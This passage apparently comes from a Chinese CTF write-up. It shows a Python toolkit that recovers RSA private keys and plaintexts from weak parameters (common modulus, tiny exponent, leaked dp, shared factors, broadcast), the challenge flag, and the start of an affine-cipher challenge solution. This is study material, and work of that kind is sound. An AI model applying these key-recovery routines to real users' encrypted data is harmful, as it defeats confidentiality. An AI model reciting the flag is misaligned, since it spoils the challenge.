class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2  <span class="hljs-comment"># 计算大整数模块</span><br><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">import</span> rsa<br><span class="hljs-keyword">from</span> Crypto.PublicKey <span class="hljs-keyword">import</span> RSA  <span class="hljs-comment"># 安装时安装pycryptodome模块</span><br><br><br><span class="hljs-comment"># 已知：p，q，e，c</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">known_p_q_e_c</span>():<br>    p = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入一个素数p：&#x27;</span>))<br>    q = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入另一个素数q：&#x27;</span>))<br>    e = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入公钥e：&#x27;</span>))<br>    c = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入密文c：&#x27;</span>))<br><br>    d = gmpy2.invert(e, (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>))<br>    m = gmpy2.powmod(c, d, p * q)<br><br>    <span class="hljs-keyword">return</span> d, m<br><br><br><span class="hljs-comment"># 已知：n(较小，不超过256bit)，e，c</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">known_nmin_e_c</span>():<br>    n = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入一个整数n：&#x27;</span>))<br>    e = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入公钥e：&#x27;</span>))<br>    c = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入密文c：&#x27;</span>))<br><br>    divisor = libnum.factorize(n)  <span class="hljs-comment"># 因式分解</span><br>    p = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">list</span>(divisor.keys())[<span class="hljs-number">0</span>])<br>    q = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">list</span>(divisor.keys())[<span class="hljs-number">1</span>])<br><br>    d = gmpy2.invert(e, (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>))<br>    m = gmpy2.powmod(c, d, n)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;素数p：<span class="hljs-subst">&#123;p&#125;</span>\n素数q：<span class="hljs-subst">&#123;q&#125;</span>&#x27;</span>)<br><br>    <span class="hljs-keyword">return</span> d, m<br><br><br><span class="hljs-comment"># 已知：n，e1,c1,e2,c2</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">known_n_e1_c1_e2_c2</span>():<br>    n = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入一个整数n：&#x27;</span>))<br>    e1 = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入公钥e1：&#x27;</span>))<br>    c1 = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入密文c1：&#x27;</span>))<br>    e2 = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入公钥e2：&#x27;</span>))<br>    c2 = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入密文c2：&#x27;</span>))<br><br>    s, s1, s2 = gmpy2.gcdext(e1, e2)  <span class="hljs-comment"># 扩展欧几里得算法</span><br>    <span class="hljs-keyword">if</span> s1 &lt; <span class="hljs-number">0</span>:<br>        s1 = - s1<br>        c1 = gmpy2.invert(c1, n)<br>    <span class="hljs-keyword">elif</span> s2 &lt; <span class="hljs-number">0</span>:<br>        s2 = - s2<br>        c2 = gmpy2.invert(c2, n)<br>    m = (<span class="hljs-built_in">pow</span>(c1, s1, n) * <span class="hljs-built_in">pow</span>(c2, s2, n)) % n<br><br>    <span class="hljs-keyword">return</span> m<br><br><br><span class="hljs-comment"># 已知：n，e(非常小)，c</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">known_n_emin_c</span>():<br>    n = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入一个整数n：&#x27;</span>))<br>    e = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入公钥e：&#x27;</span>))<br>    c = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入密文c：&#x27;</span>))<br><br>    k = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        m, flag = gmpy2.iroot(c + k * n, e)<br>        <span class="hljs-keyword">if</span> flag == <span class="hljs-literal">True</span>:<br>            <span class="hljs-keyword">return</span> m<br>        k += <span class="hljs-number">1</span><br><br><br><span class="hljs-comment"># 已知：公钥文件publickey_file</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">known_publickey_file</span>():<br>    publickey_file = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入公钥文件路径：&#x27;</span>)<br><br>    public = RSA.importKey(<span class="hljs-built_in">open</span>(publickey_file).read())  <span class="hljs-comment"># 公钥解析</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;整数n：<span class="hljs-subst">&#123;public.n&#125;</span>\n公钥e：<span class="hljs-subst">&#123;public.e&#125;</span>&#x27;</span>)<br><br><br><span class="hljs-comment"># 已知：加密文件cfile，p，q，e</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">known_cflie_p_q_e</span>():<br>    cfile = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入加密文件路径：&#x27;</span>)<br>    p = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入一个素数p：&#x27;</span>))<br>    q = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入另一个素数q：&#x27;</span>))<br>    e = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入公钥e：&#x27;</span>))<br><br>    d = gmpy2.invert(e, (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>))<br>    key = rsa.PrivateKey(p * q, e, d, p, q)  <span class="hljs-comment"># 制定新的密钥对</span><br>    m = libnum.s2n(rsa.decrypt(<span class="hljs-built_in">open</span>(cfile, <span class="hljs-string">&#x27;rb&#x27;</span>).read(), key))  <span class="hljs-comment"># 使用密钥对文件进行解密，再转换成数字</span><br><br>    <span class="hljs-keyword">return</span> d, m<br><br><br><span class="hljs-comment"># 已知：p1~pn，e，c</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">known_p1_pn_e_c</span>():<br>    x = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入n分解的质因数个数：&#x27;</span>))<br>    list_p = []<br>    pq = <span class="hljs-number">1</span><br>    n = <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">for</span> index <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(x):<br>        tmp = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">f&#x27;请输入质因子p<span class="hljs-subst">&#123;index + <span class="hljs-number">1</span>&#125;</span>：&#x27;</span>))<br>        list_p.append(tmp)<br>        pq *= tmp - <span class="hljs-number">1</span><br>        n *= tmp<br><br>    e = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入公钥e：&#x27;</span>))<br>    c = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入密文c：&#x27;</span>))<br><br>    d = gmpy2.invert(e, pq)<br>    m = gmpy2.powmod(c, d, n)<br><br>    <span class="hljs-keyword">return</span> d, m<br><br><br><span class="hljs-comment"># 已知：p，q，dp，dq，c</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">known_p_q_dp_dq_c</span>():<br>    p = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入一个素数p：&#x27;</span>))<br>    q = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入另一个素数q：&#x27;</span>))<br>    dp = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入d模(p-1)：&#x27;</span>))<br>    dq = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入d模(q-1)：&#x27;</span>))<br>    c = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入密文c：&#x27;</span>))<br><br>    mp = gmpy2.powmod(c, dp, p)<br>    mq = gmpy2.powmod(c, dq, q)<br>    m = (((mp - mq) * gmpy2.invert(q, p)) % p) * q + mq<br><br>    <span class="hljs-keyword">return</span> m<br><br><br><span class="hljs-comment"># 已知：n，e，dp，c</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">known_n_e_dp_c</span>():<br>    n = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入一个整数n：&#x27;</span>))<br>    e = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入公钥e：&#x27;</span>))<br>    dp = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入d模(p-1)：&#x27;</span>))<br>    c = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入密文c：&#x27;</span>))<br><br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, e):<br>        <span class="hljs-keyword">if</span> (dp * e - <span class="hljs-number">1</span>) % x == <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">if</span> n % (((dp * e - <span class="hljs-number">1</span>) // x) + <span class="hljs-number">1</span>) == <span class="hljs-number">0</span>:<br>                p = ((dp * e - <span class="hljs-number">1</span>) // x) + <span class="hljs-number">1</span><br>                q = n // p<br>                phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br><br>                d = gmpy2.invert(e, phi)<br>                m = gmpy2.powmod(c, d, n)<br><br>                <span class="hljs-keyword">return</span> d, m<br><br><br><span class="hljs-comment"># 已知：p+q，(p+1)*(q+1)，d，c</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">known_paq_pa1mqa1_d_c</span>():<br>    paq = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入p+q：&#x27;</span>))<br>    pa1mqa1 = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入(p+1)*(q+1)：&#x27;</span>))<br>    d = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入私钥d：&#x27;</span>))<br>    c = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入密文c：&#x27;</span>))<br><br>    n = pa1mqa1 - paq - <span class="hljs-number">1</span><br>    m = gmpy2.powmod(c, d, n)<br><br>    <span class="hljs-keyword">return</span> d, m<br><br><br><span class="hljs-comment"># 已知：e，n组、c组</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">known_e_ngroup_cgroup</span>():<br>    e = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入公钥e：&#x27;</span>))<br>    ngroup = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入n组(空格隔开)：&#x27;</span>).split()))<br>    cgroup = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入c组(空格隔开)：&#x27;</span>).split()))<br><br>    <span class="hljs-keyword">for</span> count1 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(ngroup)):<br>        <span class="hljs-keyword">for</span> count2 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(ngroup)):<br>            <span class="hljs-keyword">if</span> count1 != count2:<br>                <span class="hljs-keyword">if</span> gmpy2.gcd(ngroup[count1], ngroup[count2]) != <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> gmpy2.is_prime(gmpy2.gcd(ngroup[count1], ngroup[count2])):  <span class="hljs-comment"># 求公因数并为质数</span><br>                    p = gmpy2.gcd(ngroup[count1], ngroup[count2])<br><br>                    <span class="hljs-keyword">if</span> gmpy2.is_prime(ngroup[count1] // p):  <span class="hljs-comment"># 只有当p、q都为质数时计算才有意义</span><br>                        q = ngroup[count1] // p<br>                        d = gmpy2.invert(e, (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>))<br>                        m = <span class="hljs-built_in">pow</span>(cgroup[count1], d, ngroup[count1])<br><br>                        <span class="hljs-keyword">return</span> d, m<br><br><br><span class="hljs-comment"># 已知：n组(两两互质)、c组</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">known_ngroup_cgroup</span>():<br>    ngroup = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入n组(空格隔开)：&#x27;</span>).split()))<br>    cgroup = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入c组(空格隔开)：&#x27;</span>).split()))<br>    e_begin = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入e的最小范围(不小于2)：&#x27;</span>))<br>    e_finish = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入e的最大范围：&#x27;</span>))<br><br>    N = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> ngroup:<br>        N *= n<br><br>    <span class="hljs-keyword">for</span> e <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(e_begin, e_finish):<br>        m_power_e = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> count <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(ngroup)):<br>            m_power_e += cgroup[count] * N // ngroup[count] * gmpy2.invert(N // ngroup[count], ngroup[count])<br><br>        m, flag = gmpy2.iroot(m_power_e % N, e)<br>        <span class="hljs-keyword">if</span> flag:<br>            <span class="hljs-keyword">return</span> m<br><br><br><span class="hljs-comment"># 已知：p、q、e(与phi不互素)、c</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">known_p_q_eprime_c</span>():<br>    p = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入一个素数p：&#x27;</span>))<br>    q = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入另一个素数q：&#x27;</span>))<br>    e = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入公钥e：&#x27;</span>))<br>    c = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入密文c：&#x27;</span>))<br><br>    n = p * q<br>    phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br>    t = gmpy2.gcd(e, phi)<br>    d = gmpy2.invert(e // t, phi)<br>    m = <span class="hljs-built_in">pow</span>(c, d, n)<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(gmpy2.iroot(m, t)[<span class="hljs-number">0</span>])  <span class="hljs-comment"># 求m开t次根</span><br><br><br>d = <span class="hljs-literal">None</span><br>m = <span class="hljs-literal">None</span><br><br>condition = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;&#x27;&#x27;已知条件：1、p，q，e，c</span><br><span class="hljs-string">        2、n(较小)，e，c</span><br><span class="hljs-string">        3、n，e1，c1，e2，c2</span><br><span class="hljs-string">        4、n，e(非常小)，c</span><br><span class="hljs-string">        5、公钥解析(公钥文件)</span><br><span class="hljs-string">        6、加密文件，p，q，e，d</span><br><span class="hljs-string">        7、p1~pn(多个质因子)，e，c</span><br><span class="hljs-string">        8、p，q，dp，dq，c</span><br><span class="hljs-string">        9、n，e，dp，c</span><br><span class="hljs-string">        10、p+q，(p+1)*(q+1)，d，c</span><br><span class="hljs-string">        11、e，n组、c组</span><br><span class="hljs-string">        12、n组(两两互质)、c组</span><br><span class="hljs-string">        13、已知：p、q、e(与phi不互素)、c</span><br><span class="hljs-string">请输入序号：&#x27;&#x27;&#x27;</span>))<br><span class="hljs-keyword">if</span> condition == <span class="hljs-number">1</span>:<br>    d, m = known_p_q_e_c()<br><span class="hljs-keyword">elif</span> condition == <span class="hljs-number">2</span>:<br>    d, m = known_nmin_e_c()<br><span class="hljs-keyword">elif</span> condition == <span class="hljs-number">3</span>:<br>    m = known_n_e1_c1_e2_c2()<br><span class="hljs-keyword">elif</span> condition == <span class="hljs-number">4</span>:<br>    m = known_n_emin_c()<br><span class="hljs-keyword">elif</span> condition == <span class="hljs-number">5</span>:<br>    known_publickey_file()<br><span class="hljs-keyword">elif</span> condition == <span class="hljs-number">6</span>:<br>    d, m = known_cflie_p_q_e()<br><span class="hljs-keyword">elif</span> condition == <span class="hljs-number">7</span>:<br>    d, m = known_p1_pn_e_c()<br><span class="hljs-keyword">elif</span> condition == <span class="hljs-number">8</span>:<br>    m = known_p_q_dp_dq_c()<br><span class="hljs-keyword">elif</span> condition == <span class="hljs-number">9</span>:<br>    d, m = known_n_e_dp_c()<br><span class="hljs-keyword">elif</span> condition == <span class="hljs-number">10</span>:<br>    d, m = known_paq_pa1mqa1_d_c()<br><span class="hljs-keyword">elif</span> condition == <span class="hljs-number">11</span>:<br>    d, m = known_e_ngroup_cgroup()<br><span class="hljs-keyword">elif</span> condition == <span class="hljs-number">12</span>:<br>    m = known_ngroup_cgroup()<br><span class="hljs-keyword">elif</span> condition == <span class="hljs-number">13</span>:<br>    m = known_p_q_eprime_c()<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;请输入正确的序号！&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;私钥d：<span class="hljs-subst">&#123;d&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;明文m：<span class="hljs-subst">&#123;m&#125;</span>&#x27;</span>)<br><span class="hljs-keyword">if</span> m != <span class="hljs-literal">None</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;字符明文：<span class="hljs-subst">&#123;libnum.n2s(<span class="hljs-built_in">int</span>(m)).decode(<span class="hljs-string">&quot;utf-8&quot;</span>)&#125;</span>&#x27;</span>) <br>    <span class="hljs-comment"># 数字转字符串，再进行utf-8编码</span><br></code></pre></td></tr></table></figure><p>脚本源自<a href="http://t.csdnimg.cn/8nYow">http://t.csdnimg.cn/8nYow</a></p><p><strong>ypctf{y0u_shou1d_find_th3_seperator}</strong></p><h4 id="✓4ff1ne-2023"><a href="#✓4ff1ne-2023" class="headerlink" title="✓4ff1ne_2023"></a>✓4ff1ne_2023</h4><hr><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">a,b = ???,??<br>flag = <span class="hljs-string">b&#x27;ypctf&#123;*************&#125;&#x27;</span>  <span class="hljs-comment">#部分明文</span><br>modulus = <span class="hljs-number">2023</span><br>c = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag:<br>    c.append((a*i + b) % modulus)<br><br><span class="hljs-built_in">print</span>(c)<br><span class="hljs-comment"># [1843, 52, 1511, 848, 85, 218, 549, 483, 847, 449, 715, 682, 449, 715, 1246, 1909, 450, 1843, 715, 51, 1113, 19, 1843, 715, 250, 85, 85, 1676, 1677, 1909, 715, 1511, 1676, 52, 483, 1909, 450, 616]</span><br></code></pre></td></tr></table></figure><p>1.<em>搜题目</em></p><p>2.<em><a href="https://www.cnblogs.com/mumuhhh/p/17778200.html">https://www.cnblogs.com/mumuhhh/p/17778200.html</a></em></p><p>3.<em>affine加密</em></p><h6 id="WP-4"><a href="#WP-4" class="headerlink" title="WP"></a>WP</h6><p>这段代码演示了一个简单的加密算法，其中涉及到了一个明文消息 <code>flag</code>，一个模数 <code>modulus</code>，以及加密过程中使用的两个未知参数 <code>a</code> 和 <code>b</code>。给定的 Python 代码将这个明文消息加密成为一串数字列表 <code>c</code>。</p><p>加密算法的过程是这样的：</p><p>对于 <code>flag</code> 中的每个字节（用 <code>for i in flag</code> 循环表示，其中 <code>i</code> 是字节的值），执行加密操作 <code>c.append((a*i + b) % modulus)</code>。这里的 <code>a</code> 和 <code>b</code> 是密钥的一部分，<code>a</code> 通常称为乘法密钥，而 <code>b</code> 通常称为加法密钥。<code>modulus</code> 是一个模数，它定义了运算的同余类的界限。</p><p>在加密循环内部，每个字节 <code>i</code> 与 <code>a</code> 相乘并加上 <code>b</code>，然后对 <code>modulus</code> 取模，得到加密后的结果，并将该结果添加到列表 <code>c</code> 中。</p><p>代码的最后打印出的列表 <code>c</code> 就是加密后的密文。每个元素都是范围在 <code>[0, modulus - 1]</code> 区间内的一个整数。</p><p>为了示范这个加密过程，你需要知道 <code>a</code> 和 <code>b</code> 来生成密文列表。在实际情景中，如果你是攻击者的话，你可能需要尝试破解加密，即找出 <code>a</code> 和 <code>b</code> 的值。然而，如果 <code>a</code> 和 <code>b</code> 选择得当，想要在没有进一步信息的情况下解密可以是非常困难的。如果 <code>a</code> 和 <code>b</code> 是可行的，那这种加密其实很容易通过对明文的观察和密文的对比来破解，因为它是线性的且没有进行混淆或扩展。</p><p>但如果您手头没有 <code>a</code> 和 <code>b</code> 的值，那么您只能通过猜测或尝试找出相应的值。根据已知明文攻击或者其他分析技巧，可能可以推断出 <code>a</code> 和 <code>b</code> 的值。这种加密算法的安全性取决于密钥 <code>a</code> 和 <code>b</code> 的选择，和用于加密的模数 <code>modulus</code> 的大小。</p><p>在给定的加密列表中，可能有的人会尝试用不同方法去破解加密过程，以获得 <code>a</code> 和 <code>b</code> 的值并还原出 <code>flag</code>。</p><p>下面参考<a href="https://www.cnblogs.com/mumuhhh/p/17778200.html">https://www.cnblogs.com/mumuhhh/p/17778200.html</a></p><p>将数据稍微改动一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 